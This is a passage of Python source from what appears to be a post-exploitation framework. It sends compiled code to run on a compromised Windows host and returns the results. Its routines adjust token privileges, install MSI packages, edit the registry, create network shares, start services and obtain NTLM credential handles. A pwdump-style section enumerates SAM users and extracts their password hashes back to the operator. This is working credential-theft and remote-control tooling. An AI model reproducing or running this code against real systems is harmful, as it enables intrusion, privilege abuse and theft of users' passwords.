        #import "remote","kernel32.dll|GetLastError" as "getlasterror"
        #import "remote","advapi32.dll|AdjustTokenPrivileges" as "adjusttokenprivs"

        #import "local", "sendint" as "sendint"
        #import "local", "memcpy" as "memcpy"

        #import "local", "debug" as "debug"
        #import "string", "luid" as "luid"
        #import "int", "token" as "token"
        #import "int", "attributes" as "attributes"

        //we only support one. Otherwise, huge nightmare
        struct TOKEN_PRIVILEGES {
         int count;
         char luid[8];
         int attributes;
        };


        void main()
        {
        int res;
	int lasterror;
        struct TOKEN_PRIVILEGES tp;

        //debug();
        tp.count=1;
        memcpy(tp.luid,luid,8);
        tp.attributes=attributes;
        //debug();
        res=adjusttokenprivs(token,0,&tp,0,0,0);
	lasterror=getlasterror();
        sendint(res);
	sendint(lasterror);
        }
        """
        vars["luid"]=luid
        vars["attributes"]=attributes
        vars["token"]=token

        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        res=self.readint()
        lasterror=self.readint() #function can return success but if GetLastError() is ERROR_NOT_ALL_ASSIGNED then it's pretty much the same as failure
        self.leave()
        return res,lasterror


    def MsiInstallProduct(self,packagepath,commandline):
        #these nutty things are actually per-system, not global
        vars={}
        code="""
        #import "remote","msi.dll|MsiInstallProductA" as "MsiInstallProduct"

        #import "local", "sendint" as "sendint"

        #import "string", "packagepath" as "packagepath"
        #import "string", "commandline" as "commandline"




        void main()
        {
        int ret;
        ret=MsiInstallProduct(packagepath,commandline);
        sendint(ret); //0 on failure
        }
        """
        vars["packagepath"]=packagepath
        vars["commandline"]=commandline

        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        fd=self.readint()
        self.leave()
        return fd

    def RegOpenKeyEx(self,hKey,keyname,access):
        """
        Open a registry key for later use
        """

        hKey=keyDict.get(hKey,hKey)
        access=accessDict.get(access,access)
        vars={}
        code="""
        #import "remote","advapi32.dll|RegOpenKeyExA" as "RegOpenKeyEx"

        #import "local", "sendint" as "sendint"

        #import "string", "keyname" as "keyname"
        #import "int", "hKey" as "hKey"
        #import "int", "access" as "access"



        void main()
        {
        int ret;
        int hKey2;
        ret=RegOpenKeyEx(hKey,keyname,0,access,&hKey2);
        if (ret==0) {
           sendint(hKey2); //0 on sucess
           }
        else {
          sendint(0);
         }
        }
        """
        vars["keyname"]=keyname
        vars["hKey"]=hKey
        vars["access"]=access

        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        fd=self.readint()
        self.leave()
        return fd


    def RegQueryValueEx(self,hKey,valuename):


        hKey=keyDict.get(hKey,hKey)
        vars={}
        code="""
        #import "remote","advapi32.dll|RegQueryValueExA" as "RegQueryValueEx"

        #import "local", "sendint" as "sendint"
        #import "local", "senddata2self" as "senddata2self"

        #import "string", "valuename" as "valuename"
        #import "int", "hKey" as "hKey"




        void main()
        {
        int ret;
        int datatype;
        char data[1000];
        int datasize;

        datasize=1000;

        ret=RegQueryValueEx(hKey,valuename,0,&datatype,&data,&datasize);
        if (ret==0) {
           sendint(1);
           sendint(datatype);
           senddata2self(data,datasize); //0 on success
           }
        else {
          sendint(0); //failure
          sendint(ret); //errorcode
         }
        }
        """
        vars["valuename"]=valuename
        vars["hKey"]=hKey


        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        datatype=0
        if ret:
            datatype=self.readint()
            data=self.readblock() #value
        else:
            data=self.readint() #errorcode
        self.leave()
        return ret,datatype,data



    def RegSetValueEx(self,hKey,valuename,datatype,data):


        hKey=keyDict.get(hKey,hKey)
        datatypedict={}
        datatypedict["REG_MULTI_SZ"]=7
        datatypedict["REG_NONE"]=0
        datatypedict["REG_EXPAND_SZ"]=2
        datatypedict["REG_BINARY"]=3
        datatypedict["REG_DWORD"]=4
        datatypedict["REG_DWORD_LITTLE_ENDIAN"]=4
        datatypedict["REG_DWORD_BIG_ENDIAN"]=5
        datatypedict["REG_LINK"]=6
        datatypedict["REG_SZ"]=1

        if not datatypedict.has_key(datatype):
            ##Bad data type passed
            logging.error("Bad data type for reg key passed")
            return 0, -9999

        datatype=datatypedict.get(datatype,datatype)

        if datatype==4:
            data=intel_order(data) #you passed an integer
        if datatype==5:
            data=big_order(data)

        datasize=len(data)

        vars={}
        code="""
        #import "remote","advapi32.dll|RegSetValueExA" as "RegSetValueEx"

        #import "local", "sendint" as "sendint"

        #import "string", "valuename" as "valuename"
        #import "int", "hKey" as "hKey"
        #import "int", "datatype" as "datatype"
        #import "int", "datasize" as "datasize"
        #import "string", "data" as "data"




        void main()
        {
        int ret;

        ret=RegSetValueEx(hKey,valuename,0,datatype,data,datasize);
        if (ret==0) {
           sendint(1);
           }
        else {
          sendint(0); //failure
          sendint(ret); //errorcode
         }
        }
        """
        vars["valuename"]=valuename
        vars["hKey"]=hKey
        vars["datatype"]=datatype
        vars["datasize"]=datasize
        vars["data"]=data

        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        errorcode=0
        if ret==0:
            errorcode=self.readint() #errorcode
        self.leave()
        return ret,errorcode

    def RegEnumKeyEx(self,hKey):
        """
        Enum an opened registry key.
        """

        hKey=keyDict.get(hKey,hKey)
        vars={}
        code="""
        #import "remote","advapi32.dll|RegEnumKeyExA" as "RegEnumKeyExA"

        #import "local", "sendint" as "sendint"
        #import "local", "sendstring" as "sendstring"
        #import "local", "malloc" as "malloc"
        #import "local", "free" as "free"

        #import "int", "hKey" as "hKey"

        #define REG_SUB_SIZE 1000
        #define ERROR_NO_MORE_ITEMS 259
        #define ERROR_MORE_DATA 234

        void main()
        {
        int ret;
        int i;
        char *subkey;
        int *subkeysize;
        int go;

        i = 0;
        subkeysize = malloc(4);
        *subkeysize = REG_SUB_SIZE;
        subkey = malloc(REG_SUB_SIZE);
        go = 1;

        while(go==1){
          ret = RegEnumKeyExA(hKey, i, subkey, subkeysize, NULL, NULL, NULL, NULL);
          if(ret==0){
            sendint(1);
            sendstring(subkey);
          }
          //ERROR_MORE_DATA || ERROR_NO_MORE_ITEMS
          else{
            sendint(0);
            go=0;
          }
          //ignore ERROR_MORE_DATA
          i = i+1;
          *subkeysize = REG_SUB_SIZE;
        }
        free(subkey);
        free(subkeysize);
        }
        """
        vars["hKey"]=hKey

        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        l = []
        while self.readint() == 1:
            l.append(self.readstring())
        self.leave()
        return l

    def RegCloseKey(self,hKey):
        return self.singleVariableFunction("advapi32.dll|RegCloseKey",hKey)

    def GetDrive(self):
        return self.noVariableFunction("msvcrt.dll|_getdrive")

    def mkdir(self,drive):
        """
        Makes a directory on the remote machine (ASCII directory names only)
        """
        return self.singleVariableFunction("msvcrt.dll|_mkdir",drive,vartype="string")

    def touch(self, filename, actime, modtime):
        vars={}
        code="""
        #import "remote","msvcrt.dll|_utime" as "_utime"

        #import "local", "sendint" as "sendint"

        #import "string", "filename" as "filename"
        #import "int", "actime" as "actime"
        #import "int", "modtime" as "modtime"

        struct _utimbuf {
        long actime;
        long modtime;
        };

        void main()
        {
        struct _utimbuf utb;
        int ret;

        //set up structure
        utb.actime = actime;
        utb.modtime = modtime;

        ret = _utime(filename, &utb);
        if (ret == 0) {
           sendint(1); //0 on success
        }
        else {
          sendint(0); //-1 on failure
        }
        }
        """
        vars["filename"] = filename + "\x00"
        vars["actime"] = actime
        vars["modtime"] = modtime
        logging.debug("%s %d %d" % (filename, actime, modtime))
        self.clearfunctioncache()
        request = self.compile(code,vars)
        self.sendrequest(request)
        ret = self.readint()

        self.leave()
        return ret

    def NetShareAdd(self,netname,sharename,drivepath):
        "http://msdn.microsoft.com/library/default.asp?url=/library/en-us/netmgmt/netmgmt/netshareadd.asp"
        vars={}
        STYPE_DISKTREE=0
        code="""
        #import "remote","netapi32.dll|NetShareAdd" as "NetShareAdd"

        #import "local", "sendint" as "sendint"
        #import "local", "memset" as "memset"

        #import "string", "sharename" as "sharename"
        #import "string", "drivepath" as "drivepath"
        #import "string", "netname" as "netname"

        struct SHARE_INFO_2 {
        char * shi2_netname; //wide characters
        int shi2_type;
        char * shi2_remark; //wide characters
        int shi2_permissions;
        int shi2_max_uses;
        int shi2_current_uses;
        char * shi2_path; //wide characters
        char * shi2_passwd; //wide characters
        };


        void main()
        {
        struct SHARE_INFO_2 si;
        char remark[8];
        char *p;
        int ret;
        int err;

        p=remark;
        //clear this so it's a null string in wide characters
        memset(p,0,8);

        err=0;

        //set up structure
        si.shi2_netname=sharename;
        si.shi2_type=0;
        si.shi2_remark=p;
        si.shi2_permissions=0;
        si.shi2_max_uses=-1;
        si.shi2_current_uses=0;
        si.shi2_path=drivepath;
        si.shi2_passwd=0;

        ret=NetShareAdd(netname,2,&si,&err);
        if (ret==0) {
           sendint(1); //0 on success
           }
        else {
          sendint(0);
          sendint(ret);
          sendint(err);
         }
        }
        """
        vars["sharename"]=msunistring(sharename)+"\x00\x00\x00\x00"
        vars["drivepath"]=msunistring(drivepath)+"\x00\x00\x00\x00"
        vars["netname"]=msunistring(netname)+"\x00\x00\x00\x00"
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        errcode=0
        if ret==0:
            errcode=self.readint()
            erroffset=self.readint()
            logging.debug("errcode=%d erroffset=%d" % (errcode, erroffset))
        self.leave()
        return ret,errcode

    #####################################################################
    #LSA Routines for getpasswordhashes module
    #####################################################################
    def LsaOpenPolicy(self,system,access):
        """
        Opens a LSA Policy
        """
        if system==None:
            system="" #none, for us

        code="""
        #import "remote", "advapi32.dll|LsaOpenPolicy" as "LsaOpenPolicy"
        #import "local", "sendint" as "sendint"
        #import "local", "memset" as "memset"

        #import "string", "buffer" as "buffer"
        #import "int", "access" as "access"
        #import "int", "length" as "length"
        """
        code+="""


        struct LSA_OBJECT_ATTRIBUTES {
           int Length;
           int RootDirectory; //handle
           char * ObjectName; //PLSA_UNICODE_STRING (??) ah, an LSA_UNICODE_STRING is length,maxlength,char*
           unsigned int Attributes;
           char * SecurityDescriptor;
           char * SecurityQualityOfService; //always bad, this is windows
        };

        struct LSA_UNICODE_STRING {
           unsigned short Length; //length in bytes
           unsigned short MaximumLength; //max length in bytes
           char * Buffer; //wstring printer
        };

        void main()
        {
            struct LSA_OBJECT_ATTRIBUTES oa;
            struct LSA_UNICODE_STRING lus;
            int lsaHandle; //handle
            int ret;
            int err;
            char *bufp;
            char **bufpp;

            bufp=buffer;
            bufpp=&lus;

            //clear this
            memset(&oa,0,24);
            oa.Length=24;
        """
        if system!="":
            #add the systemname here
            code+="""
            lus.Length=length;
            lus.MaximumLength=length;
            lus.Buffer=buffer;
            """

        code+="""
            //if systemname==0, then we open on the local system. Systemname
            //  is a LSA_UNICODE_STRING structure.
            //object attributes is not used, so they shuld all be zero. This is lame.
            //accessmask is your basic access mask
            //returns 0 on success, NTSTATUS on error
        """
        if system=="":
            #systemname = null = localhost
            code+="ret=LsaOpenPolicy(0,&oa,access,&lsaHandle); //localhost\n"
        else:
            #systemname sent to api
            code+="""


            ret=LsaOpenPolicy(bufpp,&oa,access,&lsaHandle);
            """
        code+="""
            if (ret==0) {
               //success
               sendint(1);
               sendint(lsaHandle);
            } else {
              //failure
              sendint(0);
              sendint(ret);
            }
        }
        """

        vars={}
        systemname=msunistring(system)+"\x00\x00\x00\x00"
        vars["buffer"]=systemname
        vars["length"]=len(systemname)
        vars["access"]=access

        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        errcode=self.readint() #lsaHandle on success
        self.leave()
        return ret,errcode

    def LsaQueryInformationPolicy(self,policy,infoclass):
        """
        Query a LSA Policy
        """
        infoclassDict={}
        infoclassDict["PolicyPrimaryDomainInformation"]=0x3

        #POLICY_VIEW_LOCAL_INFORMATION access right on the policy handle required
        infoclassDict["PolicyAccountDomainInformation"]=0x5

        infoclass=infoclassDict.get(infoclass,infoclass)

        code="""
        #import "remote", "advapi32.dll|LsaQueryInformationPolicy" as "LsaQueryInformationPolicy"
        #import "int", "policy" as "policy"
        #import "int", "infoclass" as "infoclass"
        #import "local", "sendint" as "sendint"
        #import "local", "sendunistring2self" as "sendunistring2self"

        struct LSA_UNICODE_STRING {
           unsigned short Length; //length in bytes
           unsigned short MaximumLength; //max length in bytes
           char * Buffer; //wstring printer
        };

        struct POLICY_ACCOUNT_DOMAIN_INFO {
          struct LSA_UNICODE_STRING DomainName;
          int * DomainSid; //pointer to a SID, whatever that is
          // I guess we'll treat it like a handle?
        };


        void send_policy_info(struct POLICY_ACCOUNT_DOMAIN_INFO *pdata) {
          struct LSA_UNICODE_STRING *pstring;

          pstring=pdata->DomainName;
          sendunistring2self(pstring->Buffer);
          sendint(pdata->DomainSid);

        }

        void main()
        {
           struct POLICY_ACCOUNT_DOMAIN_INFO* pDomainInfo;
           int ret;

           pDomainInfo = 0;
           ret=LsaQueryInformationPolicy(policy,infoclass,&pDomainInfo);
           if (ret==0) {
             //success
             sendint(1);
             send_policy_info(pDomainInfo);
           }
           else {
           //some kind of error (NTSTATUS)
           sendint(0);
           sendint(ret);
           }
        }
        """

        vars={}
        vars["policy"]=policy
        vars["infoclass"]=infoclass
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        if ret==0:
            errcode=self.readint()
        else:
            buffer=self.readblock()
            sid=self.readint()
            errcode=[buffer,sid] #basically a tuple
        self.leave()
        return ret,errcode


    def SamIConnect(self,access):
        vars={}
        vars["access"]=access
        code="""
        #import "remote","samsrv.dll|SamIConnect" as "SamIConnect"

        #import "local", "sendint" as "sendint"
        #import "int", "access" as "access"


        void main()
        {
        int ret;
        int hSam;

        //I bet this 0 is the host
        ret=SamIConnect(0,&hSam,access,1);
        if (ret==0) {
           sendint(1); //0 on success
           sendint(hSam);
           }
        else {
          sendint(0);
          sendint(ret);
         }
        }
        """

        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        hSam=self.readint()
        self.leave()
        return ret,hSam


    def SamrCloseHandle(self, handle):
        """
        Closing Sam Domain Handle for cleanliness
        """
        vars={}
        vars["handle"]=handle
        code="""
        #import "remote","samsrv.dll|SamrCloseHandle" as "SamrCloseHandle"

        #import "local", "sendint" as "sendint"
        #import "int", "handle" as "handle"

        void main()
        {
           int ret;
           int pHandle;

           pHandle = handle;
           ret = SamrCloseHandle(&pHandle); // wants a pointer .. MOSDEF semantics
           sendint(ret);
        }
        """

        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        self.leave()
        return ret

    def SamrOpenDomain(self,hSam,DomainSid):
        vars={}
        vars["hSam"]=hSam
        vars["DomainSid"]=DomainSid
        code="""
        #import "remote","samsrv.dll|SamrOpenDomain" as "SamrOpenDomain"

        #import "local", "sendint" as "sendint"
        #import "int", "hSam" as "hSam"
        #import "int", "DomainSid" as "DomainSid"

        void main()
        {
        int ret;
        int hDomain;

        ret=SamrOpenDomain(hSam,0xf07ff,DomainSid,&hDomain);
        if (ret==0) {
           sendint(1); //0 on success
           sendint(hDomain);
           }
        else {
          sendint(0);
          sendint(ret);
         }
        }
        """

        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        hDomain=self.readint()
        self.leave()
        return ret,hDomain

    def SamrEnumerateUsersInDomain(self,hDomain):
        """
        This is the function that gathers the actual users. Returns 0 on failure.
        """
        vars={}
        vars["hDomain"]=hDomain
        code="""
        #import "remote","samsrv.dll|SamrEnumerateUsersInDomain" as "SamrEnumerateUsersInDomain"
        #import "remote","samsrv.dll|SamrOpenUser" as "SamrOpenUser"
        #import "remote","samsrv.dll|SamIFree_SAMPR_USER_INFO_BUFFER" as "SamIFree_SAMPR_USER_INFO_BUFFER"
        #import "remote","samsrv.dll|SamIFree_SAMPR_ENUMERATION_BUFFER" as "SamIFree_SAMPR_ENUMERATION_BUFFER"
        #import "remote","samsrv.dll|SamrQueryInformationUser" as "SamrQueryInformationUser"

        #import "int", "hDomain" as "hDomain"
        #import "local", "sendunistring2self" as "sendunistring2self"
        #import "local", "sendint" as "sendint"
        #import "local", "senddata2self" as "senddata2self"

        struct LSA_UNICODE_STRING {
           unsigned short Length; //length in bytes
           unsigned short MaximumLength; //max length in bytes
           char * Buffer; //wstring printer
        };

        struct SAM_USER_INFO {
          int rid;
          struct LSA_UNICODE_STRING name;
        };

        struct SAM_USER_ENUM {
         int count;
         struct SAM_USER_INFO *users;
        };

        void main()
        {
        int ret;
        int dwEnum;
        struct SAM_USER_ENUM *pEnum;
        struct SAM_USER_INFO *puinfo;
        unsigned char *pUserInfo;
        struct LSA_UNICODE_STRING *pLSAUS;
        int numret;
        int hUser;
        int i;
        int rid;
        //0 is access mask
        dwEnum=0;
        //dwEnum is the enumerate handle [in,out]
        pEnum = 0;
        ret=SamrEnumerateUsersInDomain(hDomain,&dwEnum,0,&pEnum,1000,&numret);
        if (ret==0 || ret==0x105) {
            sendint(1); //0 on success
            sendint(numret);
            puinfo=pEnum->users;
            i=0;
            while (i<numret) {
                i=i+1;
               //need to do SamrOpenUser

               //puinfo is pointing to our user
               rid=puinfo->rid;
               // MAXIMUM_ALLOWED=0x0200000
               sendint(rid);
               pLSAUS=puinfo->name;
               senddata2self(pLSAUS->Buffer,pLSAUS->Length);
               ret=SamrOpenUser(hDomain,0x02000000,rid, &hUser);
               if (ret<0) {
                   sendint(0);
                   sendint(ret);
               }
               else {
                 sendint(1);
                 //SAM_USER_INFO_PASSWORD_OWFS=0x12
                 pUserInfo=0;
                 ret=SamrQueryInformationUser(hUser,0x12,&pUserInfo);
                 if (ret<0) {
                     //failure
                     senddata2self(pUserInfo,0);
                 }
                 else {
                    senddata2self(pUserInfo,32);
                    SamIFree_SAMPR_USER_INFO_BUFFER (pUserInfo,0x12); //free stuff
                 }

               }
               //need to do SamrQueryInformationUser
               puinfo=puinfo+1; //we do +1==+32 correctly for pointers to structs! :>
            }
            SamIFree_SAMPR_ENUMERATION_BUFFER(pEnum); //free more stuff!
        }
        else {
          sendint(0);
          sendint(ret);
         }
        }
        """

        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint() #enumerate users ret
        allusers=[]
        if ret:
            numret=self.readint()
            #print "Successfully reading %d users"%numret
            for i in range(0,numret):
                rid=0
                username=""
                userinfo_1=""
                userinfo_2=""

                #for each user
                rid=self.readint()
                #print "Rid=%8.8x"%(uint32(rid))
                username=self.readblock()
                username=username.replace('\0','') #XXX: support Unicode someday :/
                #print "User=%s"%username
                ret=self.readint() #open user
                if ret!=0:
                    #success
                    userinfo=self.readblock()
                    if userinfo!="":
                        userinfo_1=userinfo[16:24]+userinfo[24:32]
                        userinfo_2=userinfo[0:8]+userinfo[8:16]

                    #print "Userinfo=*%s*"%(cleanhexprint(userinfo_1)+":"+cleanhexprint(userinfo_2))
                    allusers+=[(username,rid,userinfo_1,userinfo_2)]
                else:
                    #failure on openuser
                    errno=self.readint()
                retval=allusers
        else:
            errno=self.readint()
            retval=errno
            devlog("win32","Error on SamrEnumerateUsersInDomain(). 0x%8.8x"%(uint32(errno)))
        self.leave()
        return ret,retval


    def LsaClose(self, policy):
        """
        LsaClose on MSDN http://msdn2.microsoft.com/en-us/library/ms721787.aspx

        If you don't use this after opening a policy, no one else can open it (no other thread, essentially)

        """
        vars={}
        vars["policy"]=policy
        code="""
        #import "remote","advapi32.dll|LsaClose" as "LsaClose"

        #import "local", "sendint" as "sendint"
        #import "int", "policy" as "policy"

        void main()
        {
        int ret;
        int hDomain;

        ret=LsaClose(policy);
          sendint(ret);
        }
        """

        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        self.leave()
        return ret

    #####################################################################
    #End of LSA Routines for pwdump
    #####################################################################

    #####################################################################
    #Start of Routines for getting a valid NTLM context ID locally
    #####################################################################
    #initializesecuritycontext
    def GetContextID(self):
        """
        Gets a valid credentials context handle to pass to RPC calls locally
        via NTLM
        """
        ret=0
        ret,cred_handle=self.AcquireCredentialsHandle()
        if ret:
            logging.debug("Success: %x:%x" % (cred_handle[0], cred_handle[1]))
        else:
            logging.debug("Failure: %x" % cred_handle)  # errno
            return 0,0

        ret, sec_handle=self.InitializeSecurityContext(cred_handle)
        if ret:
            logging.debug("Sec Handle: %x" % sec_handle)
        else:
            logging.debug("InitSecContext: Errorcode: %x" % sec_handle)
        return ret, sec_handle

    #acquirecredentialshandle
    def AcquireCredentialsHandle(self):
        nameofprinciple="" #me.
        vars={}
        vars["fCredentialUse"]=SECPKG_CRED_OUTBOUND

        code="""
        #import "remote","secur32.dll|AcquireCredentialsHandleA" as "AcquireCredentialsHandleA"
        #import "remote", "kernel32.dll|GetLastError" as "GetLastError"

        #import "local", "sendint" as "sendint"
        #import "int", "fCredentialUse" as "fCredentialUse"
        struct CredHandle {
            int lower;
            int upper;
        };

        struct SECURITY_INTEGER {
           int lower;
           int high;
        };

        void main()

        {
        int ret;
        struct CredHandle hCred;
        struct SECURITY_INTEGER timestamp;
        int err;

        ret=AcquireCredentialsHandleA(0,"NTLM",fCredentialUse,0,0,0,0,&hCred,&timestamp);
        err=GetLastError(); // Before we do anything else
        if (ret==0) {
           sendint(1); // 0 on success
           sendint(hCred.lower);
           sendint(hCred.upper);
        }
        else {
          sendint(0);
          sendint(err);
        }
        }
        """

        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        if ret:
            #success
            lower=self.readint()
            upper=self.readint()
            val=(lower,upper)
        else:
            err=self.readint()
            val=err
        self.leave()
        return ret,val

    def InitializeSecurityContext(self,hCred):
        vars={}
        vars["hCredlower"]=hCred[0]
        vars["hCredupper"]=hCred[1]

        code="""
        #import "remote","secur32.dll|InitializeSecurityContextA" as "InitializeSecurityContextA"
        #import "remote", "kernel32.dll|GetLastError" as "GetLastError"
        #import "local", "malloc" as "malloc"

        #import "local", "sendint" as "sendint"
        #import "int", "hCredlower" as "hCredlower"
        #import "int", "hCredupper" as "hCredupper"
        struct CredHandle {
            int lower;
            int upper;
        };

         struct SecBuffer {
         int cbBuffer;
         int BufferType;
         char * pvBuffer;
         };

         struct SecBufferDesc {
         int ulVersion;
         int cBuffers;
         char * pBuffers;
         };

        void main()

        {
        //vars
        int ret;
        struct CredHandle hCred;
        int err;
        int pInput;
        int hCtx; //really a pointer to a context structure we'll be passed
        int attr;
        struct SecBufferDesc secDesc;
        struct SecBuffer secBuf;
        int context_req;


        //code

        secBuf.cbBuffer=1024;
        secBuf.BufferType=2; //SECBUFFER_TOKEN=2
        secBuf.pvBuffer=malloc(1024);

        secDesc.ulVersion=0;
        secDesc.cBuffers=0;
        secDesc.pBuffers=0;
        //ISC_REQ_ALLOCATE_MEMORY 0x00000100
        hCred.lower=hCredlower;
        hCred.upper=hCredupper;
        pInput=0;

        context_req=0x100; //unsure

        ret=InitializeSecurityContextA(&hCred,0,"",context_req,0,0,pInput,0,&hCtx,&secDesc,&attr,0);
        err=GetLastError(); // Before we do anything else
        // SEC_I_CONTINUE_NEEDED 590610
        if (ret==590610) {
           sendint(1); // 0 on success
           sendint(hCtx);
           sendint(secDesc.cBuffers);
           sendint(secDesc.pBuffers);
        }
        else {
          sendint(0);
          sendint(err);
        }
        }
        """

        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        if ret:
            #success
            hCtx=self.readint()
            cBuffers=self.readint()
            pvBuffer=self.readint()
            logging.debug("cBuffers=%x pvBuffer=%x" % (cBuffers, pvBuffer))
            val=hCtx
        else:
            err=self.readint()
            val=err
        self.leave()
        return ret,val


    #####################################################################
    #End of Routines for getting a valid NTLM context ID locally
    #####################################################################




    #####################################################################
    #Start of Service Control Manager routines
    #####################################################################

    def OpenSCManager(self,machineName=None,databaseName=None,access=None):
        """
        Opens a handle to the service control manager
        """

        code="""
        #import "remote","advapi32.dll|OpenSCManagerA" as "OpenSCManager"

        #import "local", "sendint" as "sendint"
        #import "int", "access" as "access"
        """
        if machineName!=None:
            code+="""
            #import "string", "machineName" as "machineName"
            """
        else:
            machineName=0
            code+="""
            #import "int", "machineName" as "machineName"
            """
        if databaseName!=None:
            code+="""
            #import "string", "databaseName" as "databaseName"
            """
        else:
            databaseName=0
            code+="""
            #import "int", "databaseName" as "databaseName"
            """

        code+="""

        void main()
        {
           int ret;

        ret=OpenSCManager(machineName,databaseName,access);
        sendint(ret);
        }
        """

        if access==None:
            access=GENERIC_READ
        vars={}
        vars["machineName"]=machineName
        vars["databaseName"]=databaseName
        vars["access"]=access

        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        self.leave()
        return ret

    def OpenService(self,hSCManager,serviceName,access=None):
        """
        Opens a handle to the service control manager
        """

        code="""
        #import "remote","advapi32.dll|OpenServiceA" as "OpenService"
        #import "remote", "kernel32.dll|GetLastError" as "GetLastError"

        #import "local", "sendint" as "sendint"
        #import "int", "access" as "access"
        #import "int", "hSCManager" as "hSCManager"
        #import "string", "serviceName" as "serviceName"

        void main()
        {
           int ret;
           int error;
           ret=OpenService(hSCManager,serviceName,access);
           error=GetLastError();
           sendint(ret);
           if (ret==0) {
              sendint(error);
           }
        }
        """


        if access==None:
            access=SERVICE_START | SERVICE_QUERY_STATUS
        vars={}
        vars["hSCManager"]=hSCManager
        vars["serviceName"]=serviceName
        vars["access"]=access

        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        error=0
        if ret==0:
            error=self.readint()
        self.leave()
        return ret,error


    def StartService(self,hService):
        """
        Starts a Service
        """

        code="""
        #import "remote","advapi32.dll|StartServiceA" as "StartService"
        #import "remote", "kernel32.dll|GetLastError" as "GetLastError"

        #import "local", "sendint" as "sendint"
        #import "int", "hService" as "hService"

        void main()
        {
           int ret;
           int error;

           // Add arguments later
           ret=StartService(hService,0,0);
           error=GetLastError();
           sendint(ret);
           sendint(error);
        }
        """


        vars={}
        vars["hService"]=hService

        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        error=self.readint()
        self.leave()
        return ret,error

    def QueryServiceStatus(self,hService):
        """
        Starts a Service
        """

        code="""
        #import "remote","advapi32.dll|QueryServiceStatus" as "QueryServiceStatus"
        #import "remote", "kernel32.dll|GetLastError" as "GetLastError"

        #import "local", "sendint" as "sendint"
        #import "int", "hService" as "hService"

        struct SERVICE_STATUS {
        int dwServiceType;
        int dwCurrentState;
        int dwControlsAccepted;
        int dwWin32ExitCode;
        int dwServiceSpecificExitCode;
        int dwCheckPoint;
        int dwWaitHint;
        };

        void main()
        {
           int ret;
           int error;
           struct SERVICE_STATUS ServStatus;
           // Add arguments later
           ret=QueryServiceStatus(hService,&ServStatus);
           error=GetLastError();
           sendint(ret);
           if (ret==0) {
             sendint(error);
            }
            else {
              sendint(ServStatus.dwCurrentState);
            }
        }
        """


        vars={}
        vars["hService"]=hService

        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        if ret==0:
            val=self.readint() #error if ret!=0, else status
        else:
            val={}
            val["dwCurrentState"]=self.readint()
        self.leave()
        return ret,val

    def EnumServicesStatusEx(self,hManager,dwServiceType=SERVICE_WIN32,dwServiceState=SERVICE_STATE_ALL,ResumeHandle=0):
        """
        Enumerate all the services
        """

        code="""
        #import "remote","advapi32.dll|EnumServicesStatusExA" as "EnumServicesStatusEx"
        #import "remote", "kernel32.dll|GetLastError" as "GetLastError"

        #import "local", "sendint" as "sendint"
        #import "local", "sendstring" as "sendstring"
        #import "local", "malloc" as "malloc"
        #import "local", "free" as "free"
        #import "int", "hManager" as "hManager"
        #import "int", "InfoLevel" as "InfoLevel"
        #import "int", "dwServiceType" as "dwServiceType"
        #import "int", "dwServiceState" as "dwServiceState"
        #import "int", "ResumeHandle" as "ResumeHandle"

         struct SERVICE_STATUS_PROCESS {
         int dwServiceType;
         int dwCurrentState;
         int dwControlsAccepted;
         int dwWin32ExitCode;
         int dwServiceSpecificExitCode;
         int dwCheckPoint;
         int dwWaitHint;
         int dwProcessId;
         int dwServiceFlags;
         };

        struct ENUM_SERVICE_STATUS_PROCESS {
        char * lpServiceName;
        char * lpDisplayName;
        struct SERVICE_STATUS_PROCESS ServiceStatusProcess;
        };
        void main()
        {
           int ret;
           int error;
           int i;
           int * lpResumeHandle;
           int sbBufSize;
           char  * lpServices;
           int ServicesReturned;
           int cbBytesNeeded;
           int myResumeHandle;
           struct ENUM_SERVICE_STATUS_PROCESS * curr_service;
           struct SERVICE_STATUS_PROCESS * curr_serv_stat;


           //code
           myResumeHandle=ResumeHandle;
           lpResumeHandle=&myResumeHandle;
           lpServices=malloc(50000);
           sbBufSize=50000;

           // Add pszGroupName later
           ret=EnumServicesStatusEx(hManager,InfoLevel,dwServiceType,dwServiceState,lpServices,sbBufSize,&cbBytesNeeded,&ServicesReturned,lpResumeHandle,0);
           error=GetLastError();
           sendint(ret);
           if (ret==0) {
              sendint(error);
            }
            else {
              sendint(ServicesReturned);
              i=0;
              curr_service=lpServices;
              while (i<ServicesReturned)  {
                sendstring(curr_service->lpServiceName);
                sendstring(curr_service->lpDisplayName);
                // MOSDEF C isn't like normal C when you do this kind of thing
                curr_serv_stat=curr_service->ServiceStatusProcess;
                sendint(curr_serv_stat->dwCurrentState);
                sendint(curr_serv_stat->dwProcessId);

                i=i+1;
                curr_service=curr_service+1;
              }
            }
            free(lpServices);
        }
        """
        SC_ENUM_PROCESS_INFO=0
        InfoLevel=SC_ENUM_PROCESS_INFO

        vars={}
        vars["hManager"]=hManager
        vars["InfoLevel"]=InfoLevel
